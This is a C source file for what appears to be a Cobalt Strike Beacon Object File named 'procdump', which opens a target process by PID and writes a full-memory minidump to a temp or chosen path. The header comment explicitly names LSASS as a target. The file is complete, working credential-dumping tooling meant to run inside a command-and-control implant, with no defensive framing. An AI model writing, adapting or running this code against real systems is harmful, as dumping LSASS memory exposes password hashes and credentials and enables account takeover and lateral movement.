/*
 * procdump <pid> [output] - MiniDumpWriteDump a process (LSASS included).
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

void go(char *args, int alen)
{
    datap parser;
    int pid;
    char *out = "";
    int olen = 0;
    char path[512];
    HANDLE p, f;
    BOOL ok;

    BeaconDataParse(&parser, args, alen);
    pid = BeaconDataInt(&parser);
    out = BeaconDataExtract(&parser, &olen);
    if (pid <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "usage: procdump <pid> [output.dmp]\n");
        return;
    }

    if (out && out[0]) {
        bof_strncpy(path, out, sizeof(path));
    } else {
        char tmp[256];
        char num[16];
        KERNEL32$GetTempPathA(sizeof(tmp), tmp);
        bof_itoa((unsigned long long)pid, num);
        bof_strncpy(path, tmp, sizeof(path));
        bof_strncat(path, "bof_", sizeof(path) - bof_strlen(path) - 1);
        bof_strncat(path, num, sizeof(path) - bof_strlen(path) - 1);
        bof_strncat(path, ".dmp", sizeof(path) - bof_strlen(path) - 1);
    }

    p = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, (DWORD)pid);
    if (!p) {
        BeaconPrintf(CALLBACK_ERROR, "OpenProcess(%d) failed: %lu\n",
                     pid, (unsigned long)KERNEL32$GetLastError());
        return;
    }

    f = KERNEL32$CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (f == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "CreateFile(%s) failed: %lu\n",
                     path, (unsigned long)KERNEL32$GetLastError());
        KERNEL32$CloseHandle(p);
        return;
    }

    ok = DBGHELP$MiniDumpWriteDump(p, (DWORD)pid, f, MiniDumpWithFullMemory,
                                   NULL, NULL, NULL);
    KERNEL32$CloseHandle(f);
    KERNEL32$CloseHandle(p);

    if (ok)
        BeaconPrintf(CALLBACK_OUTPUT, "Dumped PID %d -> %s\n", pid, path);
    else
        BeaconPrintf(CALLBACK_ERROR, "MiniDumpWriteDump failed: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
}
